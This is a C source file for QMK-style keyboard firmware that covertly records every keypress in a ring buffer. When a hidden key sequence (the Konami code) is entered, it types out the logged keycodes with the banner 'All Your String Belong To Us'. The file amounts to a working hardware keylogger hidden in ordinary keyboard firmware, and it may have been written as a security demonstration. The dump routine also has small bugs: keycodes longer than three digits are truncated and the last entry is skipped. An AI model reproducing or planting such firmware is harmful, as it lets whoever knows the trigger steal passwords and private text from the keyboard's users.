// Copyright 2023 Dale Nunns (@Dale Nunns)
// SPDX-License-Identifier: GPL-2.0-or-later

#include "k6901.h"
#include "quantum.h"
#include <stdio.h>

#define MAX_KEYLOG_BUFFER_LENGTH 100

//uint16_t dumpKey[] = {KC_H,KC_U,KC_N,KC_T,KC_E,KC_R,KC_3};
uint16_t dumpKey[] = {KC_UP,KC_UP,KC_DOWN,KC_DOWN,KC_LEFT,KC_RIGHT,KC_LEFT,KC_RIGHT,KC_A,KC_B};
static int dumpKeyPos = 0;

static uint16_t keylog[MAX_KEYLOG_BUFFER_LENGTH];
static int keylogPos = 0;

bool process_record_user(uint16_t keycode, keyrecord_t *record) {
    if (record->event.pressed) {
        if (keycode == dumpKey[dumpKeyPos]) {
            dumpKeyPos++;
            if (dumpKeyPos > (sizeof(dumpKey) /sizeof(dumpKey[0])) -1 ) {
                SEND_STRING("\nAll Your String Belong To Us\n");
                dump_keylog();
                SEND_STRING("\n--------\n");
            }
        } else {dumpKeyPos =0;}
    }

    return true;
}

bool process_record_kb(uint16_t keycode, keyrecord_t *record) {
   
    if (record->event.pressed) {
        log_key(keycode, record);
    }

    return process_record_user(keycode, record);
}


void log_key(uint16_t keycode, keyrecord_t *record) {
    
    keylog[keylogPos] = keycode;
    keylogPos++;

    if (keylogPos >= MAX_KEYLOG_BUFFER_LENGTH) {keylogPos = 0;}
}



void dump_keylog(void) {
    char buffer[4];
    for (int idx=0; idx < MAX_KEYLOG_BUFFER_LENGTH -1; idx++) {
        snprintf(buffer, sizeof buffer, "%d ", keylog[idx]);
        send_string(buffer);
    }
}